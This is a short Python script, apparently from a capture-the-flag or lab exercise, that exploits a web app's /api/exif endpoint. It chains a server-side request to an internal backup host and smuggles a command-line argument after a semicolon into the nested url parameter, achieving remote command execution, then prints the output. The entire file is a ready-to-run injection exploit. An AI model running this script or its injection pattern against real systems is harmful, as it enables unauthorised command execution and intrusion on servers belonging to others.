#!/usr/bin/python3

import requests
import os
import sys

def inject(ip, args):
    """Injects url into website using cmd args"""
    r = requests.get(f'http://{ip}/api/exif?url=http://api-dev-backup:8080/exif?url=1;{args}')

    result = r.text
    lines = result.splitlines()

    if (len(lines) > 6):
        print('\n'.join(lines[6:]))
    else:
        print('\n'.join(lines))

# driver code
if __name__ == "__main__":
    ip = sys.argv[1]
    cmd_args = sys.argv[2]
    inject(ip, cmd_args)
